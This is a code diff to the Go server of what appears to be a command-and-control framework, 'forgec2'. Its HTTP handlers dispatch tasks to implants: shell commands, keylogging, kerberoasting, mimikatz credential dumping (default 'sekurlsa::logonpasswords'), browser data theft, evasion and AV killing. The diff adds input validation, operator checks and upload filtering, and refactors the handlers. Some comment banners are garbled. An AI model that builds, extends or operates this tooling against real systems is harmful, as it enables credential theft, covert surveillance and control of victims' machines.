@@ -1,16 +1,79 @@
-﻿package server
+package server
 
 import (
 	"encoding/base64"
 	"fmt"
 	"io"
 	"log/slog"
+	"net"
 	"net/http"
+	"net/url"
+	"path/filepath"
+	"strconv"
 	"strings"
 
 	"github.com/forgec2/forgec2/internal/db"
 	"github.com/gin-gonic/gin"
 )
+
+func validateCallbackURL(rawURL string) error {
+	parsed, err := url.Parse(rawURL)
+	if err != nil {
+		return fmt.Errorf("invalid URL")
+	}
+	if parsed.Scheme != "http" && parsed.Scheme != "https" {
+		return fmt.Errorf("scheme must be http or https")
+	}
+	host := parsed.Hostname()
+	if host == "" {
+		return fmt.Errorf("missing host")
+	}
+	ip := net.ParseIP(host)
+	if ip == nil {
+		ips, err := net.LookupIP(host)
+		if err != nil || len(ips) == 0 {
+			return fmt.Errorf("cannot resolve host")
+		}
+		ip = ips[0]
+	}
+	if isPrivateIP(ip.String()) {
+		return fmt.Errorf("private/internal IP addresses are not allowed")
+	}
+	return nil
+}
+
+func validatePID(s string) error {
+	n, err := strconv.Atoi(s)
+	if err != nil || n <= 0 {
+		return fmt.Errorf("must be a positive integer PID")
+	}
+	return nil
+}
+
+func validatePort(s string) error {
+	n, err := strconv.Atoi(s)
+	if err != nil || n < 1 || n > 65535 {
+		return fmt.Errorf("must be a valid port (1-65535)")
+	}
+	return nil
+}
+
+// allowedCallbackMethods restricts callback HTTP methods to safe verbs.
+// DELETE, PUT, PATCH are rejected to prevent SSRF-based request forgery.
+var allowedCallbackMethods = map[string]bool{
+	"GET": true, "POST": true, "HEAD": true,
+}
+
+func validateCallbackMethod(method string) error {
+	if method == "" {
+		return nil
+	}
+	upper := strings.ToUpper(method)
+	if !allowedCallbackMethods[upper] {
+		return fmt.Errorf("callback method %q not allowed (use GET, POST, or HEAD)", method)
+	}
+	return nil
+}
 
 func (s *Server) handleShellPage(c *gin.Context) {
 	id := c.Param("id")
@@ -38,6 +101,9 @@ func (s *Server) handleShellPage(c *gin.Context) {
 }
 
 func (s *Server) handleSendCommand(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	cmd := c.PostForm("command")
 	shell := c.PostForm("shell")
@@ -47,7 +113,7 @@ func (s *Server) handleSendCommand(c *gin.Context) {
 		shell = "cmd.exe"
 	}
 
-	slog.Info("handleSendCommand called", "agent_id", id, "command", cmd)
+	slog.Info("handleSendCommand called", "agent_id", id, "command", truncateString(cmd, 100))
 
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -62,6 +128,14 @@ func (s *Server) handleSendCommand(c *gin.Context) {
 
 	// Set callback fields if provided
 	if callbackURL != "" {
+		if err := validateCallbackURL(callbackURL); err != nil {
+			respondError(c, http.StatusBadRequest, "invalid callback URL: "+err.Error())
+			return
+		}
+		if err := validateCallbackMethod(callbackMethod); err != nil {
+			respondError(c, http.StatusBadRequest, err.Error())
+			return
+		}
 		s.db.Model(&task).Updates(map[string]interface{}{
 			"callback_url":    callbackURL,
 			"callback_method": callbackMethod,
@@ -72,19 +146,37 @@ func (s *Server) handleSendCommand(c *gin.Context) {
 		}
 	}
 
-	slog.Info("Task created successfully", "agent_id", id, "task_id", task.ID, "command", cmd)
+	slog.Info("Task created successfully", "agent_id", id, "task_id", task.ID, "command", truncateString(cmd, 100))
 	s.dispatchTask(c, task, "send_command", cmd)
 }
 
 func (s *Server) handleGetAgentTasks(c *gin.Context) {
 	id := c.Param("id")
+	page, _ := strconv.Atoi(c.DefaultQuery("page", "1"))
+	pageSize, _ := strconv.Atoi(c.DefaultQuery("pageSize", "0"))
+	if page < 1 {
+		page = 1
+	}
+	if pageSize < 1 || pageSize > MaxTaskPageSize {
+		pageSize = DefaultTaskPageSize
+	}
+
+	query := s.db.Where("agent_id = ?", id).
+		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"})
+
+	var total int64
+	query.Model(&db.Task{}).Count(&total)
 
 	var tasks []db.Task
-	s.db.Where("agent_id = ?", id).
-		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop", "ls"}).
-		Order("created_at desc").Limit(AgentTasksLimit).Find(&tasks)
+	offset := (page - 1) * pageSize
+	query.Order("created_at desc").Offset(offset).Limit(pageSize).Find(&tasks)
 
-	c.JSON(http.StatusOK, gin.H{"tasks": tasks})
+	c.JSON(http.StatusOK, gin.H{
+		"tasks":    tasks,
+		"total":    total,
+		"page":     page,
+		"pageSize": pageSize,
+	})
 }
 
 func (s *Server) handleGetTaskStatus(c *gin.Context) {
@@ -108,6 +200,62 @@ func (s *Server) handleGetTaskStatus(c *gin.Context) {
 	})
 }
 
+// handleBatchTaskStatus returns the status of multiple tasks in a single request.
+// POST /api/v1/tasks/batch-status  body: task_ids=1,2,3
+func (s *Server) handleBatchTaskStatus(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	idsStr := c.PostForm("task_ids")
+	if idsStr == "" {
+		idsStr = c.Query("task_ids")
+	}
+	if idsStr == "" {
+		respondError(c, http.StatusBadRequest, "task_ids is required")
+		return
+	}
+
+	idStrs := strings.Split(idsStr, ",")
+	if len(idStrs) > 100 {
+		respondError(c, http.StatusBadRequest, "too many task IDs (max 100)")
+		return
+	}
+
+	var ids []uint
+	for _, s := range idStrs {
+		s = strings.TrimSpace(s)
+		n, err := strconv.ParseUint(s, 10, 32)
+		if err != nil {
+			continue
+		}
+		ids = append(ids, uint(n))
+	}
+	if len(ids) == 0 {
+		respondError(c, http.StatusBadRequest, "no valid task IDs")
+		return
+	}
+
+	var tasks []db.Task
+	s.db.Where("id IN ?", ids).Find(&tasks)
+
+	type taskStatus struct {
+		ID     uint   `json:"id"`
+		Status string `json:"status"`
+		Result string `json:"result,omitempty"`
+		Error  string `json:"error,omitempty"`
+	}
+	results := make([]taskStatus, len(tasks))
+	for i, t := range tasks {
+		results[i] = taskStatus{
+			ID:     t.ID,
+			Status: t.Status,
+			Result: t.Result,
+			Error:  t.Error,
+		}
+	}
+	c.JSON(http.StatusOK, gin.H{"tasks": results, "total": len(results)})
+}
+
 func (s *Server) handleRequestPS(c *gin.Context) {
 	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"ps", "request_ps", "process list"})
 }
@@ -117,6 +265,14 @@ func (s *Server) handleSuspendProcess(c *gin.Context) {
 	target := c.PostForm("target")
 	if target == "" {
 		target = c.PostForm("command")
+	}
+	if target == "" {
+		respondError(c, http.StatusBadRequest, "target PID is required")
+		return
+	}
+	if err := validatePID(target); err != nil {
+		respondError(c, http.StatusBadRequest, "invalid PID: "+err.Error())
+		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -136,6 +292,14 @@ func (s *Server) handleResumeProcess(c *gin.Context) {
 	if target == "" {
 		target = c.PostForm("command")
 	}
+	if target == "" {
+		respondError(c, http.StatusBadRequest, "target PID is required")
+		return
+	}
+	if err := validatePID(target); err != nil {
+		respondError(c, http.StatusBadRequest, "invalid PID: "+err.Error())
+		return
+	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
@@ -153,6 +317,14 @@ func (s *Server) handleKillProcess(c *gin.Context) {
 	target := c.PostForm("target")
 	if target == "" {
 		target = c.PostForm("command")
+	}
+	if target == "" {
+		respondError(c, http.StatusBadRequest, "target PID is required")
+		return
+	}
+	if err := validatePID(target); err != nil {
+		respondError(c, http.StatusBadRequest, "invalid PID: "+err.Error())
+		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -175,6 +347,10 @@ func (s *Server) handleClipboardSet(c *gin.Context) {
 	data := c.PostForm("data")
 	if data == "" {
 		data = c.PostForm("command")
+	}
+	if data == "" {
+		respondError(c, http.StatusBadRequest, "clipboard data is required")
+		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -213,6 +389,10 @@ func (s *Server) handleRegGet(c *gin.Context) {
 	if key == "" {
 		key = c.PostForm("command")
 	}
+	if key == "" {
+		respondError(c, http.StatusBadRequest, "registry key path is required")
+		return
+	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
@@ -229,6 +409,10 @@ func (s *Server) handleRegSet(c *gin.Context) {
 	id := c.Param("id")
 	path := c.PostForm("path")
 	data := c.PostForm("data")
+	if path == "" {
+		respondError(c, http.StatusBadRequest, "registry path is required")
+		return
+	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
@@ -246,6 +430,10 @@ func (s *Server) handleRegDelete(c *gin.Context) {
 	key := c.PostForm("key")
 	if key == "" {
 		key = c.PostForm("command")
+	}
+	if key == "" {
+		respondError(c, http.StatusBadRequest, "registry key path is required")
+		return
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
@@ -280,6 +468,9 @@ func (s *Server) handleListServices(c *gin.Context) {
 }
 
 func (s *Server) handlePortScan(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	target := c.PostForm("target")
 	if target == "" {
@@ -310,6 +501,9 @@ func (s *Server) handleAV(c *gin.Context) {
 }
 
 func (s *Server) handleDownloadURL(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	url := c.PostForm("url")
 	dest := c.PostForm("dest")
@@ -416,66 +610,15 @@ func (s *Server) handleKillAV(c *gin.Context) {
 
 // Keylogger handlers (high-value addition)
 func (s *Server) handleStartKeylogger(c *gin.Context) {
-	if !s.requireOperator(c) {
-		return
-	}
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "keylogger_start", "", "", "", "", 0, 0)
-	if err != nil {
-		slog.Error("Failed to create keylogger start task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
-		return
-	}
-
-	s.LogAuditRecord(c, "keylogger_start", "agent", id, "Started keylogger", true, nil)
-	slog.Info("Keylogger started", "agent", id)
-	s.dispatchTask(c, task, "keylogger_start", "start")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_start", "keylogger_start", "start"})
 }
 
 func (s *Server) handleStopKeylogger(c *gin.Context) {
-	if !s.requireOperator(c) {
-		return
-	}
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "keylogger_stop", "", "", "", "", 0, 0)
-	if err != nil {
-		slog.Error("Failed to create keylogger stop task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
-		return
-	}
-
-	s.LogAuditRecord(c, "keylogger_stop", "agent", id, "Stopped keylogger", true, nil)
-	slog.Info("Keylogger stopped", "agent", id)
-	s.dispatchTask(c, task, "keylogger_stop", "stop")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_stop", "keylogger_stop", "stop"})
 }
 
 func (s *Server) handleDumpKeylogger(c *gin.Context) {
-	if !s.requireOperator(c) {
-		return
-	}
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-
-	task, err := s.createTask(id, "keylogger_dump", "", "", "", "", 0, 0)
-	if err != nil {
-		slog.Error("Failed to create keylogger dump task", "agent_id", id, "error", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
-		return
-	}
-
-	s.LogAuditRecord(c, "keylogger_dump", "agent", id, "Dumped keylogger buffer", true, nil)
-	slog.Info("Keylogger dump requested", "agent", id)
-	s.dispatchTask(c, task, "keylogger_dump", "dump logs")
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"keylogger_dump", "keylogger_dump", "dump logs"})
 }
 
 // === High value CS parity: 1(SOCKS),3(creds),4(inject),6(lateral) ===
@@ -623,6 +766,24 @@ func (s *Server) handleCancelTask(c *gin.Context) {
 		"error":  "cancelled by operator",
 	})
 
+	if task.Status == "running" {
+		abortTask := db.Task{
+			AgentID:  agentID,
+			Type:     "abort",
+			Command:  fmt.Sprintf("%d", taskID),
+			Status:   "pending",
+			Priority: 3,
+			CreatedBy: c.GetString("user"),
+		}
+		if err := s.db.Create(&abortTask).Error; err == nil {
+			s.agentPendingTasksMu.Lock()
+			s.agentPendingTasks[agentID]++
+			s.agentPendingTasksMu.Unlock()
+			s.broadcastTaskUpdate(agentID, abortTask)
+			slog.Info("Abort task injected for cancelled running task", "agent", agentID, "original_task", taskID)
+		}
+	}
+
 	slog.Info("Task cancelled", "agent", agentID, "task", taskID, "type", task.Type)
 	s.LogAuditRecord(c, "cancel_task", "agent", agentID, fmt.Sprintf("Cancelled task #%d (%s)", taskID, task.Type), true, nil)
 	s.broadcastTaskUpdate(agentID, task)
@@ -709,44 +870,7 @@ func (s *Server) handleExecuteAssembly(c *gin.Context) {
 
 // 鈹€鈹€ kerberoast: Request TGS hashes for all SPNs 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleKerberoast(c *gin.Context) {
-	if !s.requireOperator(c) {
-		return
-	}
-	id := c.Param("id")
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "kerberoast", "", "", "", "", 0, 0)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
-		return
-	}
-	slog.Info("Kerberoast requested", "agent", id)
-	s.LogAuditRecord(c, "kerberoast", "agent", id, "Kerberoast requested", true, nil)
-	s.dispatchTask(c, task, "kerberoast", "")
-}
-
-// 鈹€鈹€ mimikatz: Run mimikatz command 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
-func (s *Server) handleMimikatz(c *gin.Context) {
-	if !s.requireOperator(c) {
-		return
-	}
-	id := c.Param("id")
-	command := c.PostForm("command")
-	if command == "" {
-		command = "sekurlsa::logonpasswords"
-	}
-	if _, ok := s.getAgentOrFail(c, id); !ok {
-		return
-	}
-	task, err := s.createTask(id, "mimikatz", command, "", "", "", 0, 0)
-	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to create task")
-		return
-	}
-	slog.Info("Mimikatz requested", "agent", id, "command", command)
-	s.LogAuditRecord(c, "mimikatz", "agent", id, fmt.Sprintf("Mimikatz: %s", command), true, nil)
-	s.dispatchTask(c, task, "mimikatz", command)
+	s.createSimpleTask(c, c.Param("id"), simpleTaskDef{"kerberoast", "kerberoast", "Kerberoast requested"})
 }
 
 // 鈹€鈹€ elevate_printnightmare: PrintNightmare exploit 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
@@ -866,30 +990,53 @@ func (s *Server) handlePowerPick(c *gin.Context) {
 
 // 鈹€鈹€ Browser Data Theft 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleBrowserSteal(c *gin.Context) {
+	s.createOneParamTask(c, oneParamTaskDef{
+		taskType:     "browser_steal",
+		audit:        "browser_steal",
+		defaultValue: "all",
+		auditDetailFn: func(val string) string { return "Browser steal: " + val },
+	})
+}
+
+func (s *Server) handleMimikatz(c *gin.Context) {
 	if !s.requireOperator(c) {
 		return
 	}
 	id := c.Param("id")
-	browser := c.PostForm("browser")
-	if browser == "" {
-		browser = "all"
+	cmd := c.PostForm("command")
+	if cmd == "" {
+		cmd = c.PostForm("target")
+	}
+	if cmd == "" {
+		cmd = "sekurlsa::logonpasswords"
 	}
 	if _, ok := s.getAgentOrFail(c, id); !ok {
 		return
 	}
-	task, err := s.createTask(id, "browser_steal", browser, "", "", "", 0, 0)
+	// Auto-attach local module (data/modules/Invoke-Mimikatz.ps1) — no remote IEX.
+	moduleB64 := s.loadMimikatzModuleB64()
+	task, err := s.createTask(id, "mimikatz", cmd, "", "", moduleB64, 0, 0)
 	if err != nil {
-		slog.Error("Failed to create browser_steal task", "agent_id", id, "error", err)
+		slog.Error("Failed to create mimikatz task", "agent_id", id, "error", err)
 		respondError(c, http.StatusInternalServerError, "failed to create task")
 		return
 	}
-	slog.Info("Browser data theft requested", "agent", id, "browser", browser)
-	s.LogAuditRecord(c, "browser_steal", "agent", id, "Browser steal: "+browser, true, nil)
-	s.dispatchTask(c, task, "browser_steal", "Browser steal: "+browser)
+	detail := "Mimikatz: " + cmd
+	if moduleB64 != "" {
+		detail += " (module attached)"
+	} else {
+		detail += " (no server module; implant needs local script)"
+	}
+	slog.Info("mimikatz requested", "agent", id, "module_attached", moduleB64 != "")
+	s.LogAuditRecord(c, "mimikatz", "agent", id, detail, true, nil)
+	s.dispatchTask(c, task, "mimikatz", detail)
 }
 
 // 鈹€鈹€ BOF: Upload and execute Beacon Object File 鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 func (s *Server) handleNetCommand(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
 	id := c.Param("id")
 	command := c.PostForm("command")
 	if command == "" {
@@ -1013,6 +1160,35 @@ func (s *Server) handleETWHardwareBP(c *gin.Context) {
 	s.dispatchTask(c, task, "etw_hardware_bp", "ETW Hardware Breakpoint")
 }
 
+func (s *Server) handleRunEvasion(c *gin.Context) {
+	if !s.requireOperator(c) {
+		return
+	}
+	id := c.Param("id")
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return
+	}
+
+	technique := c.PostForm("technique")
+	if technique == "" {
+		technique = c.Query("technique")
+	}
+	if technique == "" {
+		respondError(c, http.StatusBadRequest, "technique parameter required")
+		return
+	}
+
+	task, err := s.createTask(id, "run_evasion", technique, "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create run_evasion task", "agent_id", id, "technique", technique, "error", err)
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return
+	}
+	slog.Info("Run evasion requested", "agent", id, "technique", technique)
+	s.LogAuditRecord(c, "run_evasion", "agent", id, "Run evasion: "+technique, true, nil)
+	s.dispatchTask(c, task, "run_evasion", "Run Evasion: "+technique)
+}
+
 func (s *Server) handleSandboxDetectAdvanced(c *gin.Context) {
 	if !s.requireOperator(c) {
 		return
@@ -1103,33 +1279,167 @@ func (s *Server) createSimpleTask(c *gin.Context, id string, def simpleTaskDef) 
 	return true
 }
 
+// oneParamTaskDef defines a task that reads a single value from a form field
+// (trying "command" then "target"), with an optional default and custom detail formatter.
+type oneParamTaskDef struct {
+	taskType      string
+	audit         string
+	paramField1   string // primary form field name (empty = "command")
+	paramField2   string // fallback form field name (empty = "target")
+	defaultValue  string // used when both fields are empty
+	required      bool   // if true, return 400 when empty
+	auditDetailFn func(val string) string // optional custom detail formatter (nil = use raw value)
+}
+
+// createOneParamTask reads a single parameter from form fields and dispatches the task.
+func (s *Server) createOneParamTask(c *gin.Context, def oneParamTaskDef) bool {
+	if !s.requireOperator(c) {
+		return false
+	}
+	id := c.Param("id")
+	field1 := def.paramField1
+	if field1 == "" {
+		field1 = "command"
+	}
+	field2 := def.paramField2
+	if field2 == "" {
+		field2 = "target"
+	}
+
+	val := c.PostForm(field1)
+	if val == "" {
+		val = c.PostForm(field2)
+	}
+	if val == "" {
+		val = def.defaultValue
+	}
+	if def.required && val == "" {
+		respondError(c, http.StatusBadRequest, def.taskType+" requires a parameter")
+		return false
+	}
+
+	if _, ok := s.getAgentOrFail(c, id); !ok {
+		return false
+	}
+
+	task, err := s.createTask(id, def.taskType, val, "", "", "", 0, 0)
+	if err != nil {
+		slog.Error("Failed to create task", "type", def.taskType, "agent_id", id, "error", err)
+		respondError(c, http.StatusInternalServerError, "failed to create task")
+		return false
+	}
+
+	detail := val
+	if def.auditDetailFn != nil {
+		detail = def.auditDetailFn(val)
+	}
+	slog.Info(def.taskType+" requested", "agent", id, "param", val)
+	s.dispatchTask(c, task, def.audit, detail)
+	return true
+}
+
+// allowedUploadExtensions maps field names to their allowed file extensions.
+// This prevents arbitrary file uploads that could be used as attack vectors.
+var allowedUploadExtensions = map[string][]string{
+	"shellcode":  {".bin", ".raw", ".dat", ".sc", ".exe", ".dll", ".c", ".txt"},
+	"assembly":   {".exe", ".dll", ".csproj", ".zip", ".txt"},
+	"bof":        {".o", ".bin", ".dat", ".txt"},
+	"file":       {".txt", ".csv", ".json", ".xml", ".log", ".ps1", ".bat", ".cmd", ".vbs", ".js", ".py", ".rb", ".sh", ".c", ".h", ".bin"},
+	"payload":    {".exe", ".dll", ".ps1", ".sh", ".bin", ".dat"},
+	"config":     {".yaml", ".yml", ".json", ".xml", ".ini", ".conf", ".toml"},
+}
+
+// validateUploadExtension checks whether the file extension is allowed for the given field.
+func validateUploadExtension(fieldName, filename string) error {
+	allowed, ok := allowedUploadExtensions[fieldName]
+	if !ok {
+		// Unknown field: allow common text/binary extensions only
+		allowed = []string{".txt", ".bin", ".dat", ".csv", ".json", ".xml", ".log", ".ps1", ".bat", ".sh", ".c", ".h"}
+	}
+	lower := strings.ToLower(filename)
+	for _, ext := range allowed {
+		if strings.HasSuffix(lower, ext) {
+			return nil
+		}
+	}
+	return fmt.Errorf("file extension not allowed for %s: %s (allowed: %s)", fieldName, filepath.Ext(filename), strings.Join(allowed, ", "))
+}
+
+// validateUploadMagicBytes reads the first 16 bytes and rejects obviously dangerous content.
+// This is a defense-in-depth check; extension validation is the primary gate.
+func validateUploadMagicBytes(fieldName, filename string, data []byte) error {
+	if len(data) < 4 {
+		return nil // too short to matter
+	}
+	// Reject PE executables uploaded as shellcode/bof (should be raw bytes)
+	dangerous := map[string][]string{
+		"shellcode": {"MZ", "PK"},  // .exe, .zip disguised as shellcode
+		"bof":       {"MZ", "PK"},
+		"assembly":  {"PK"},
+	}
+	badPrefixes, ok := dangerous[fieldName]
+	if !ok {
+		return nil
+	}
+	for _, prefix := range badPrefixes {
+		if string(data[:min(len(data), len(prefix))]) == prefix {
+			ext := filepath.Ext(filename)
+			if ext == ".exe" || ext == ".dll" || ext == ".zip" {
+				continue // allowed by extension, don't reject
+			}
+			return fmt.Errorf("suspicious file content for %s (magic bytes match %s)", fieldName, prefix)
+		}
+	}
+	return nil
+}
+
+func min(a, b int) int {
+	if a < b {
+		return a
+	}
+	return b
+}
+
 // handleFileUpload reads an uploaded file from a form field and returns base64 content.
 // fieldName is the form field name (e.g. "shellcode", "assembly", "bof").
 func (s *Server) handleFileUpload(c *gin.Context, fieldName string) (filename, b64Data string, size int64, ok bool) {
 	file, err := c.FormFile(fieldName)
 	if err != nil {
-		respondError(c, http.StatusBadRequest, fieldName + " file required")
+		respondError(c, http.StatusBadRequest, fieldName+" file required")
 		return
 	}
 	if file.Size > MaxUploadSize {
 		respondError(c, http.StatusBadRequest, fmt.Sprintf("file too large: %d bytes (max %d)", file.Size, MaxUploadSize))
 		return
 	}
+
+	// Validate file extension before reading content
+	if err := validateUploadExtension(fieldName, file.Filename); err != nil {
+		respondError(c, http.StatusBadRequest, err.Error())
+		return
+	}
+
 	f, err := file.Open()
 	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to read " + fieldName)
+		respondError(c, http.StatusInternalServerError, "failed to read "+fieldName)
 		return
 	}
 	defer f.Close()
 	data, err := io.ReadAll(f)
 	if err != nil {
-		respondError(c, http.StatusInternalServerError, "failed to read " + fieldName + " data")
+		respondError(c, http.StatusInternalServerError, "failed to read "+fieldName+" data")
 		return
 	}
+
+	// Validate magic bytes for defense-in-depth
+	if err := validateUploadMagicBytes(fieldName, file.Filename, data); err != nil {
+		respondError(c, http.StatusBadRequest, err.Error())
+		return
+	}
+
 	filename = file.Filename
 	size = int64(len(data))
 	b64Data = base64.StdEncoding.EncodeToString(data)
 	ok = true
 	return
 }
-
